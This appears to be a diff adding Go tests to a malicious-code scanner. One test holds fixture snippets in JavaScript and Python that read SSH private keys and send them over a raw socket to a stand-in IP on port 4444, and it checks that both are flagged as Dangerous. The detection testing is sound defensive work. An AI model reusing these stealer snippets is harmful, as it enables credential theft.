@@ -194,3 +194,50 @@ func TestLargeBase64BlobNotFlaggedForDataURI(t *testing.T) {
 		t.Fatalf("bare blob should be flagged, got %v", ids)
 	}
 }
+
+func TestStealerOverRawSocketIsDangerous(t *testing.T) {
+	res, ids := scan(t, map[string]string{
+		"steal.js": "const net = require('net');\nconst fs = require('fs');\n" +
+			"const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');\n" +
+			"const sock = net.connect(4444, '203.0.113.7');\nsock.write(key);\n",
+		"steal.py": "import socket, os\n" +
+			"key = open(os.path.expanduser('~/.ssh/id_ed25519'), 'rb').read()\n" +
+			"s = socket.create_connection(('203.0.113.7', 4444))\ns.sendall(key)\n",
+	})
+	if !ids["connects-by-socket-to-ip"] || !ids["reads-credentials-and-sends-data-out"] {
+		t.Fatalf("missing socket or combination finding; got %v", ids)
+	}
+	if res.Verdict != Dangerous {
+		t.Fatalf("want Dangerous, got %s", res.Verdict)
+	}
+	// Each file must be escalated on its own, not just one of them.
+	critical := map[string]bool{}
+	for _, f := range res.Findings {
+		if f.Severity == Critical {
+			critical[f.File] = true
+		}
+	}
+	if !critical["steal.js"] || !critical["steal.py"] {
+		t.Fatalf("both files should be critical; got %v", critical)
+	}
+}
+
+func TestLocalSocketHealthCheckStaysClean(t *testing.T) {
+	res, ids := scan(t, map[string]string{
+		"health.js": "const net = require('net');\nnet.connect(5432, '127.0.0.1').on('connect', () => process.exit(0));\n",
+		"db.py":     "import socket\ns = socket.create_connection(('10.0.0.5', 5432))\nt = socket.create_connection(('192.168.1.20', 80))\n",
+		"rs.rs":     "let s = TcpStream::connect(\"172.16.0.9:80\");\n",
+	})
+	if res.Verdict != Clean {
+		t.Fatalf("want Clean, got %s: %v", res.Verdict, ids)
+	}
+}
+
+func TestSocketToPublicIPWithoutCredentialsIsOnlyCaution(t *testing.T) {
+	res, ids := scan(t, map[string]string{
+		"ping.go": "conn, _ := net.Dial(\"tcp\", \"203.0.113.7:80\")\n_ = conn\n",
+	})
+	if !ids["connects-by-socket-to-ip"] || res.Verdict != Caution {
+		t.Fatalf("want Caution with socket rule, got %s %v", res.Verdict, ids)
+	}
+}
